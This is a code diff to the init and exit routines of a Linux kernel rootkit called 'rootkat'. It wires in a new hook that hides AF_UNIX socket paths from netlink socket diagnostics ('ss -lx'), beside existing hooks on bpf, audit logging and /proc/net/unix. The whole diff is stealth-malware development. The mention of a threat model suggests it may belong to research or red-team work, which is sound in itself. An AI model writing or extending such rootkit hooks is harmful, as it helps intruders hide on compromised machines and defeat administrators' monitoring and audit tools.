@@ -14,6 +14,7 @@
 #include "hook_sys_bpf.h"
 #include "hook_audit.h"
 #include "hook_unix_seq_show.h"
+#include "hook_unix_diag.h"
 #include "hidden_unix_paths.h"
 
 #define ROOTKAT_TAG "rootkat: "
@@ -99,12 +100,18 @@ static int __init rootkat_init(void)
 	if (rc)
 		pr_warn(ROOTKAT_TAG "audit_log_start hook failed: %d\n", rc);
 
-	/* Non-fatal: AF_UNIX path hide via /proc/net/unix. The matching
-	 * NETLINK_SOCK_DIAG path remains uncovered for v0.7 (see
-	 * docs/threat-model.md). */
+	/* Non-fatal: AF_UNIX path hide via /proc/net/unix. */
 	rc = rootkat_hook_unix_seq_show_install();
 	if (rc)
 		pr_warn(ROOTKAT_TAG "unix_seq_show hook failed: %d (proc unix path not hidden)\n",
+		        rc);
+
+	/* Non-fatal: AF_UNIX path hide via NETLINK_SOCK_DIAG (`ss -lx`).
+	 * Closes the v0.7 gap. Resolved via module-scoped lookup because
+	 * sk_diag_fill is a static name colliding across diag modules. */
+	rc = rootkat_hook_unix_diag_install();
+	if (rc)
+		pr_warn(ROOTKAT_TAG "unix_diag hook failed: %d (ss -lx not closed)\n",
 		        rc);
 
 	pr_info(ROOTKAT_TAG "loaded (hidden)\n");
@@ -113,6 +120,7 @@ static int __init rootkat_init(void)
 
 static void __exit rootkat_exit(void)
 {
+	rootkat_hook_unix_diag_remove();
 	rootkat_hook_unix_seq_show_remove();
 	rootkat_hook_audit_log_start_remove();
 	rootkat_hook_sys_bpf_remove();
